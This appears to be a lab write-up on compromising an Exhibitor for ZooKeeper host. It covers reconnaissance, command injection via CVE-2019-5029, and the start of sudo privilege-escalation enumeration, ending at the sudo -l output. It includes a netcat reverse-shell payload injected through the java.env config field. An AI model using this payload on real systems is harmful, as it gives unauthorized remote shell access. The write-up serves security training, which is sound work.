Exhibitor (Zookeeper) Writeup

Exploiting Exhibitor Web UI Command Injection (CVE-2019-5029) and abusing sudo privileges on gcore for Root access.

1. Reconnaissance

We started with a comprehensive Nmap scan to identify open ports and services running on the target 192.168.246.98.

zsh — nmap

Findings:

  • Port 22 (SSH): Standard OpenSSH. No public exploits available for this version.
  • Port 445/139 (SMB): Authenticated with NULL session using smbclient but only found default shares.
  • Port 8081 (HTTP): Nginx 1.14.2. Accessing this redirects to Port 8080.
  • Port 8080 (HTTP): Hosts the Exhibitor Web UI.

2. Web Enumeration & Vulnerability Analysis

Navigating to port 8080, we are presented with the Exhibitor for ZooKeeper interface. Based on the footer information, we identified the version as v1.0.

Figure 1: Exhibitor Web UI Dashboard

A quick search using searchsploit revealed a critical vulnerability for this version.

CVE-2019-5029: Command Injection

Arbitrary shell commands surrounded by backticks or $() can be inserted into the Config editor and will be executed by the Exhibitor process when it launches ZooKeeper.

3. Exploitation (RCE)

We followed the exploit steps outlined in the vulnerability disclosure:

  1. Open the Config tab in the Web UI.
  2. Flip the Editing switch to ON.
  3. Locate the java.env script field.
  4. Inject the reverse shell payload surrounded by $().
$(/bin/nc -e /bin/sh 192.168.45.XXX 443 &)

After clicking Commit > All At Once > OK, the Exhibitor process restarts and executes our payload.

zsh — nc

4. Privilege Escalation

Sudo Enumeration

Checking for sudo privileges revealed that the user can run gcore as root without a password.

ssh — charles@pelican
charles@pelican:~$ sudo -l Matching Defaults entries for zookeeper on exhibitor: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin User zookeeper may run the following commands on exhibitor: (root) NOPASSWD: /usr/bin/gcore
